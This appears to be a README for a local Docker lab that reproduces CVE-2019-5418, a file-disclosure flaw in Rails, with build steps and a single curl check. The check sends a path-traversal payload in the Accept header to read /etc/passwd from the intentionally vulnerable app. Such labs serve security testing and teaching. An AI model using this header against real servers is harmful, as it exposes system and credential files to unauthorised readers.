# Rails

This code is based on [https://chybeta.github.io/2019/03/16/Analysis-for%E3%80%90CVE-2019-5418%E3%80%91File-Content-Disclosure-on-Rails/](https://chybeta.github.io/2019/03/16/Analysis-for%E3%80%90CVE-2019-5418%E3%80%91File-Content-Disclosure-on-Rails/).

Start in this directory (be sure the port 8896 is not used, otherwise change it):

```
docker build -t rails_fi_app . && docker run -d -p 127.0.0.1:8896:3000 -v "$(pwd)"/app:/myapp rails_fi_app
docker exec -ti <id> bash
```
# Check

```
curl -X GET -H 'Accept: ../../../../../../../etc/passwd{{' http://localhost:8896/fileinclusion
```
